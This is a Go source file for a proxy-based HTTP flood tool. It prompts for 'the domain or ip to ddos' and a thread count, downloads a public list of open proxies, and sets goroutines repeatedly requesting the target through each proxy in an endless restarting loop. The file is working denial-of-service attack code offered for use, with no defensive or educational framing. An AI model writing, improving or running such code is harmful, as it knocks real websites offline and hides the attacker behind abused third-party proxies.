package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

var statusCodeToEscape = []string{
	"503 Too many open connections",
	"401 Unauthorized",
	"409 Conflict",
	"404 Not Found",
	"502 Bad Gateway",
	"504 Gateway Timeout",
	"407 Proxy Authentication Required",
	"400 Bad Request",
	"502 Proxy Error",
	"403 Forbidden",
	"503 Service Unavailable",
	"504 DNS Name Not Found",
	"407 Unauthorized",
}

func getProxyList() []string {
	//get the list of proxy at https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
	//format of the list is ip:port
	//return a list of proxy
	resp, err := http.Get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func chunkSlice(s []string, total_to_divided int) [][]string {
	var divided [][]string
	var chunk = float32(len(s) / total_to_divided)
	var start, end = 0, 0
	for i := 0; i < total_to_divided; i++ {
		end = start + int(chunk)
		if end > len(s) {
			end = len(s)
		}
		divided = append(divided, s[start:end])
		start = end
	}
	return divided
}

func stringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func handlerProxy(domain, proxy string) string {
	//just connect to the website and check the status code
	//use proxy to connect
	//format of proxy is ip:port
	//format of domain is domain.com
	proxyUrl, err := url.Parse("http://" + proxy)
	if err != nil {
		return "error"
	}
	//create a new http client
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyUrl),
		}}

	//client timeout after 1 second
	client.Timeout = time.Second * 5
	//connect to the website
	resp, err := client.Get("http://" + domain)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()
	//if resp is 503 too many connection
	// make [][]string statusCodeToEscape
	if stringInSlice(resp.Status, statusCodeToEscape) {
		return "error"
	}
	if resp.StatusCode != 0 {
		fmt.Println(resp.Status)
		return resp.Status
	}
	return "error"
}

func main() {
	//get the list of proxy
	proxy_list := getProxyList()
	//ask for the domain or ip to ddos
	fmt.Println("Enter the domain or ip to ddos")
	var domain string
	fmt.Scanln(&domain)
	//ask for the number of threads
	fmt.Println("Enter the number of threads")
	var threads int
	fmt.Scanln(&threads)
	//chunk the proxy list
	chunked_proxy_list := chunkSlice(proxy_list, threads)
	//start the threads
	//create a channel list of good proxy
	for {
		var wg sync.WaitGroup
		for _, chunk := range chunked_proxy_list {
			wg.Add(1)
			go func(chunk []string) {
				defer wg.Done()
				for _, proxy := range chunk {
					for {
						//time.Sleep(time.Millisecond * 100)
						status := handlerProxy(domain, proxy)
						if status != "error" {
							fmt.Println("Thread found a good proxy")
							continue
						} else {
							break
						}

					}
					fmt.Println("Thread died")
					return
				}
			}(chunk)
		}
		wg.Wait()
		fmt.Println("All threads are dead, restarting")
	}
}
